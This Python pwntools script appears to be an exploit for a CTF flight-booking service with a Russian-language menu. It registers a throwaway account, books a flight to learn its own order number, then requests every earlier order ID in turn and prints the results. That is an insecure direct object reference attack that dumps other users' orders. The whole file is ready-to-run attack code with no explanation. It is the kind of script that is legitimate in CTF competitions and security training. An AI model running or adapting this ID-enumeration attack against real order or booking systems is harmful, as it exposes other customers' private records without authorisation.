#/usr/bin/env python3
from pwn import *
import string
import random

host = sys.argv[1]
port = 2067

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

s = remote(host, port)

s.recvuntil('Выйти\n'.encode())

username = generator()
password = generator()

s.send('3\n'.encode())
s.recvuntil(':\n'.encode())
s.send(f'{username}\n'.encode())
s.recvuntil(':\n'.encode())
s.send(f'{password}\n'.encode())
s.recvuntil('Выйти\n'.encode())

s.send('2\n'.encode())
s.recvuntil(':\n'.encode())
s.send(f'{username}\n'.encode())
s.recvuntil(':\n'.encode())
s.send(f'{password}\n'.encode())
s.recvuntil('Выйти\n'.encode())

s.send('1\n'.encode())
flight_table = s.recvuntil('Выйти\n'.encode()).decode('utf8').split('\n\n')[0]
flight_notes = flight_table.split('\n')

rand_flight_note = flight_notes[random.randint(0, len(flight_notes) - 1)]
flight_id = int(rand_flight_note.strip().split('|')[1].split('-')[1])
s.send('2\n'.encode())
s.recvuntil(':\n'.encode())
s.send(f'{flight_id}\n'.encode())
s.recvuntil(':\n'.encode())
s.send('\n'.encode())
s.recvuntil(':\n'.encode())
s.send('\n'.encode())
s.recvuntil('Выйти\n'.encode())

s.send('3\n'.encode())
msg = s.recvuntil('Выйти\n'.encode()).decode('utf8')
data = msg.split('\n\n')[0].split('\n')[1].split(' ')[1].split('-')[1]
order_id = int(data[:len(data)-1])

for i in range(1, order_id):
    s.send('4\n'.encode())
    s.recvuntil(':\n'.encode())
    s.send(f'{i}\n'.encode())
    print(s.recvuntil('Выйти\n'.encode()).decode('utf8'), flush=True)

s.close()